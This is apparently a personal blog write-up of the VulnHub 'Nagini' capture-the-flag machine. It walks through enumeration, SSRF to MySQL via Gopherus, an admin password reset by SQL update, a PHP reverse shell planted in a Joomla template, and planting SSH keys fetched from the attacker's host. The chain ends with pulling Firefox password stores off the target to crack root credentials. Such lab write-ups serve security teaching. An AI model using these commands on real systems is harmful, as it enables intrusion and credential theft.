---
title: HarryPotter-Nagini - Writeup
author: Elman Alizadeh
date: 2022-05-17 16:48:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, harrypotter]
---

Today we will take a look at Vulnhub: Nagini. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-harry-nagini/1.jpg" | relative_url }})

## Network scan

Command: sudo nmap -p- -sV -sC -oN nmap/open — open 192.168.0.110

![Desktop View]({{ "/assets/img/vuln-harry-nagini/2.png" | relative_url }})

## Gobuster

Command: gobuster dir -u http://192.168.0.110 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt

We found an directory here: "/note.txt"

```console
Hello developers!!

I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.

Regards,
site_admin
```
Here we see the word http3, let’s research.

[Github](https://github.com/cloudflare/quiche)

Let’s download and setup.

Command: git clone — recursive https://github.com/cloudflare/quiche

Command: cargo build — examples

Command: cd target/debug/examples

Command: ./http3-client https://192.168.0.110/

```console
<html>
<head>
<title>Information Page</title>
</head>
<body>
Greetings Developers!!

I am having two announcements that I need to share with you:

1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
2. All developers are requested not to put any configuration’s backup file (.bak) in main production servers as they are readable by every one.

Regards,
site_admin
</body>
</html>
```

## Ssrf

When we look at the /internalResourceFeTcher.php extension, we see a button. When I thought it was a command injection, it didn’t work. I doubted it was ssrf. For this I wrote 127.0.0.1 and the result:

![Desktop View]({{ "/assets/img/vuln-harry-nagini/3.png" | relative_url }})

We also found the /joomla extension. The .bak file can be found here. Let’s check

## Joomscan

Command: joomscan -u http://192.168.0.110/joomla/

```console
[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.9.25

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://192.168.0.110/joomla/administrator/components
http://192.168.0.110/joomla/administrator/modules
http://192.168.0.110/joomla/administrator/templates
http://192.168.0.110/joomla/tmp
http://192.168.0.110/joomla/images/banners

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://192.168.0.110/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.0.110/joomla/robots.txt

Interesting path found from robots.txt
http://192.168.0.110/joomla/joomla/administrator/
http://192.168.0.110/joomla/administrator/
http://192.168.0.110/joomla/bin/
http://192.168.0.110/joomla/cache/
http://192.168.0.110/joomla/cli/
http://192.168.0.110/joomla/components/
http://192.168.0.110/joomla/includes/
http://192.168.0.110/joomla/installation/
http://192.168.0.110/joomla/language/
http://192.168.0.110/joomla/layouts/
http://192.168.0.110/joomla/libraries/
http://192.168.0.110/joomla/logs/
http://192.168.0.110/joomla/modules/
http://192.168.0.110/joomla/plugins/
http://192.168.0.110/joomla/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config file is found
config file path : http://192.168.0.110/joomla/configuration.php.bak
```
Let’s download the .bak file and look at its contents.

The part we need:

```console
public $dbtype = ‘mysqli’;
public $host = ‘localhost’;
public $user = ‘goblin’;
public $password = ‘’;
public $db = ‘joomla’;
public $dbprefix = ‘joomla_’;
```

We found ssrf here. Now we have a database. We will use this vulnerability to view and make changes to the database data.

Therefore, we will use this tool

[Gopherus](https://github.com/tarunkant/Gopherus)

Command: git clone https://github.com/tarunkant/Gopherus.git

Command: python2 gopherus.py — exploit mysql

Let’s enter the data.

![Desktop View]({{ "/assets/img/vuln-harry-nagini/4.png" | relative_url }})

We get it after pasting it on the button.


![Desktop View]({{ "/assets/img/vuln-harry-nagini/5.png" | relative_url }})

Now we will get more detailed information.

![Desktop View]({{ "/assets/img/vuln-harry-nagini/6.png" | relative_url }})

![Desktop View]({{ "/assets/img/vuln-harry-nagini/7.png" | relative_url }})

I tried to crack hash here. But i can’t. Therefore, I will check the update.

```console
Command: use joomla;update joomla_users set password=’5f4dcc3b5aa765d61d8327deb882cf99'where username=’site_admin’
```
Here is the password changed. Let’s log in as an administrator.

![Desktop View]({{ "/assets/img/vuln-harry-nagini/8.png" | relative_url }})

## Reverse shell

Get reverse shell

Extensions — >Templates — >Protostar — > New File

![Desktop View]({{ "/assets/img/vuln-harry-nagini/9.png" | relative_url }})

[ReverseShell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Change your ip address and get a paste. Then go to this directory.

Url- http://yourip/joomla/templates/protostar/rev.php

After entering

Command: script /dev/null -c bash

Command: export TERM=xterm

## Snape

Command: cd /home/snape

Command: cat .creds.txt

Decode with Base64

```console
Pass: Love@lilly
```

Command: su snape

![Desktop View]({{ "/assets/img/vuln-harry-nagini/1.gif" | relative_url }})

## Hermiona

Command: ssh-keygen -f hermoine

Command: python3 -m http.server 80

In target

Command: cd /home/snape/

Command: wget http://192.168.0.107/hermoine.pub

Command: mv hermoine.pub authorized_keys

Command: chmod 640 authorized_keys

Command: cd /home/hermoine/bin/

Command: ./su_cp -p -r /home/snape/authorized_keys /home/hermoine/.ssh/

## Ssh

Command: ssh hermoine@192.168.0.110 -i hermoine

![Desktop View]({{ "/assets/img/vuln-harry-nagini/2.gif" | relative_url }})

## Root

There was a .mozilla folder in the Hermione folder. When I looked inside the folders, I was confronted with such information.

command: cd /home/hermoine/.mozilla/firefox/g2mhbq0o.default

```console
key4.db

logins.json
```

[Medium](https://medium.com/geekculture/how-to-hack-firefox-passwords-with-python-a394abf18016)

I need to transfer these two files to my local machine to crack the passwords.

Command: python3 -m http.server

![Desktop View]({{ "/assets/img/vuln-harry-nagini/10.png" | relative_url }})

I will use this tool to break it.

[Firepwd](https://github.com/lclevy/firepwd/)

Command: git clone https://github.com/lclevy/firepwd/

Command: sudo pip install -r requirements.txt

After uploading two files from the target machine, start the tool.

Command: python firepwd.py

![Desktop View]({{ "/assets/img/vuln-harry-nagini/11.png" | relative_url }})

Here we found the root password

Command: su root

![Desktop View]({{ "/assets/img/vuln-harry-nagini/13.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-harry-nagini/3.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”




